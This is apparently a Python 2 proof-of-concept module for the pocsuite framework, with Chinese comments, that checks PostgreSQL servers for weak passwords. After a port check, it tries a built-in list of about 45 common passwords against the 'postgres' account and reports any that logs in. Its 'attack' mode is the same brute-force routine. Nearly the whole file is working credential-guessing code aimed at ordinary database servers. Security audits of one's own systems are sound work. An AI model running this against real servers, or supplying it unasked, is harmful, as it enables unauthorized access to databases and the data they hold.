#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
#pg数据库
class PGPOC(POCBase):
    vulID = '29'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-15' #漏洞公开的时间,不知道就写今天

    author = 'wanglin' #  PoC作者的大名
    createDate ='2018-05-15'# 编写 PoC 的日期
    updateDate = '2018-05-15'# PoC 更新的时间,默认和编写时间一样
    references = ''# 漏洞地址来源,0day不用写
    name = 'Postgresql Unauthorized access & Weak-Password'# PoC 名称
    appPowerLink = 'https://www.postgresql.org'# 漏洞厂商主页地址
    appName = 'Postgresql'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Weak-Password'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Postgresql 未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['psycopg2'] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        

    def _verify(self):
        import psycopg2
        #调用指纹方法
        result={}
        passwd = ['123456','admin','root','password','123123','123','1','','{user}',
          '{user}{user}','{user}1','{user}123','{user}2016','{user}2015',
          '{user}!','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#',
          '123456789','123321','1314520','666666','woaini','fuckyou','000000',
          '1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456',
          '1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!',
          'p@ssw0rd!','password1','r00t','system','111111','admin']

        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', self.url)
        if len(_port) != 0:
            _host = url2ip(self.url)[0]
            _port = url2ip(self.url)[1]
        else :
            _host = url2ip(self.url)
            _port = "5432"
        print _host, _port

        import socket
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            sk.connect((_host,_port))
            #print 'Server port is OK!'
        except Exception:
            print 'port not alive'
            return self.save_output(result)
        sk.close()

        output = Output(self)
        message = ''
        for pwd in passwd:
            try:
                pwd = pwd.replace('{user}', 'postgres')
                conn = psycopg2.connect(host=_host, port=_port, user='postgres', password=pwd)
                message = u' {} 5432端口 Postgresql 存在弱口令: postgres  {}'.format(_host, pwd)
                print "有弱口令漏洞"
                conn.close()
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
                result['VerifyInfo']['Payload'] = message
                break
            except Exception as e:
                print e
        print '[+]29 poc done'
        return self.save_output(result)


    #攻击模块
    def _attack(self):
        return self._verify()

    #输出报告
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(PGPOC)